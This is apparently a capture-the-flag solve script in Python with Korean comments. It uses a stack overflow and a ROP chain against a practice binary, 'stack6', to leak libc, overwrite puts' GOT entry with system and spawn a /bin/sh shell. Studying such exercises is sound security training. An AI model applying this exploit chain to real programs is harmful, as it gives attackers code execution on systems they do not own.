from pwn import *

# 대상 프로그램 실행
p = process('./stack6')

# PLT와 GOT 주소 정의
puts_plt = 0x401050    # puts 함수의 PLT 주소
puts_got = 0x404018    # puts 함수의 GOT 주소
gets_plt = 0x401060    # gets 함수의 PLT 주소

# ROP 가젯 주소 정의
pop_rdi_ret = 0x4011f3  # pop rdi; ret 가젯
ret = 0x40101a          # ret 가젯 (스택 정렬용)

# 첫 번째 페이로드 구성
payload = b'A' * 0x48   # 버퍼와 SFP 덮어쓰기
payload += p64(pop_rdi_ret)  # pop rdi; ret 가젯으로 리턴 주소 덮어쓰기
payload += p64(puts_got)     # rdi에 puts의 GOT 주소 저장
payload += p64(puts_plt)     # puts 함수 호출하여 GOT의 실제 주소 출력
payload += p64(pop_rdi_ret)  # 다시 pop rdi; ret 가젯
payload += p64(puts_got)     # rdi에 puts의 GOT 주소 저장
payload += p64(gets_plt)     # gets 함수 호출하여 system 주소 입력
payload += p64(ret)          # 스택 정렬을 위한 ret 가젯
payload += p64(pop_rdi_ret)  # pop rdi; ret 가젯
payload += p64(puts_got + 8) # rdi에 /bin/sh 문자열이 저장될 주소 지정
payload += p64(puts_plt)     # puts 함수 호출하여 /bin/sh 문자열 출력

# 첫 번째 페이로드 전송
p.sendline(payload)

# puts의 실제 주소 수신 및 파싱
p.recvline()
puts_libc = u64(p.recvn(6) + b'\x00\x00')  # puts의 실제 주소 추출
libc_base = puts_libc - 0x84420            # libc 베이스 주소 계산
system_libc = libc_base + 0x52290          # system 함수의 실제 주소 계산

# 디버깅 정보 출력
print('puts_libc:', hex(puts_libc))
print('libc_base:', hex(libc_base))
print('system_libc:', hex(system_libc))

# 두 번째 페이로드 구성 (system 함수 주소와 /bin/sh 문자열)
payload2 = p64(system_libc)    # system 함수 주소
payload2 += b'/bin/sh\x00'     # /bin/sh 문자열
p.sendline(payload2)           # 두 번째 페이로드 전송

# 대화형 모드 시작
p.interactive()
